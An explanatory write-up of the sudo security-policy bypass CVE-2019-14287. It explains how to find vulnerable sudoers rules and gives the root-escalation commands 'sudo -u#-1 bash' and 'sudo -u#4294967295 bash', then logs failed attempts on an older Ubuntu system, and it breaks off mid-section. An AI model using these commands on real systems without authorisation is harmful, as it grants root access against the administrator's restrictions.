## CVE2019-14287 (sudo < 1.8.28)
Sudo Flaw Linux Users Can Run Commands As Root Even When They're Restricted

## Sudo Vulnerabilty Descriptions
```
The vulnerability in a sudo security policy bypass issue that could allow a malicious user or a program to
execute arbitrary commands as root on a targeted Linux system even when the "sudoers configuration" explicitly
disallows the root access.
```
```
So, even if a user has been restricted to run a specific, or any, command as root, the vulnerability could allow the user to
bypass this security policy and take complete control over the system.
```
## Who Discovered this ?
```
An Apple Information Security Researcher by Joe Vennix
```
## How to Identify this Attack ?
If you have Permission to see sudoers file then,
```
if /etc/sudoers Conf file Says, 
bob    (ALL, !root) /usr/bin/vi or,
bob    (ALL, !root) /usr/bin/id 
Then user bob can run vi with any other user except root.
```
If you don't have Permission then you can Identify by typing "sudo -l"

Note: User must be of sudoers group.
```
lucy@ubuntu:/home/debian$ sudo -l
Matching Defaults entries for lucy on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lucy may run the following commands on this host:
    (ALL, !root) /usr/bin/bash
```

## How to Exploit this issue ?
```
The flaw can be exploited by an attacker to run commands as root by specifying the user ID "-1" or "4294967295."  
```
Run the below command as 
```
sudo -u#-1 bash 
or,
sudo -u#4294967295 bash 
```
## Didn't work, When I used /usr/bin/bash to execute Accept root

```
lucy    ALL=(ALL, !root)        /usr/bin/bash
```

```
Sudo version 1.8.3p1
OS: Ubuntu 12.04.5 LTS \n \l
Kernel: Linux ubuntu 3.13.0-117-generic
```
```
lucy@ubuntu:/home/debian$ whoami
lucy
lucy@ubuntu:/home/debian$ groups
lucy
lucy@ubuntu:/home/debian$ sudo whoami
Sorry, user lucy is not allowed to execute '/usr/bin/whoami' as root on ubuntu.
lucy@ubuntu:/home/debian$ sudo bash
Sorry, user lucy is not allowed to execute '/bin/bash' as root on ubuntu.
lucy@ubuntu:/home/debian$ sudo -l
Matching Defaults entries for lucy on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lucy may run the following commands on this host:
    (ALL, !root) /usr/bin/bash
lucy@ubuntu:/home/debian$ sudo bash
Sorry, user lucy is not allowed to execute '/bin/bash' as root on ubuntu.
lucy@ubuntu:/home/debian$ sudo -u#4294967295 bash 
Sorry, user lucy is not allowed to execute '/bin/bash' as #4294967295 on ubuntu.
lucy@ubuntu:/home/debian$ sudo -u#-1 bash 
Sorry, user lucy is not allowed to execute '/bin/bash' as #-1 on ubuntu.
```
## This also didn't work
```
lucy@ubuntu:/home/debian$ sudo -u#4294967295 bash -u
[sudo] password for lucy: 
Sorry, user lucy is not allowed to execute '/bin/bash -u' as #4294967295 on ubuntu.

lucy@ubuntu:/home/debian$ sudo -u#-1 bash -u
[sudo] password for lucy: 
Sorry, user lucy is not allowed to execute '/bin/bash -u' as #-1 on ubuntu.
```
## But it Works when is used this "/usr/bin/id"
```
lucy    ALL=(ALL, !root)        /usr/bin/id
```

```

    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
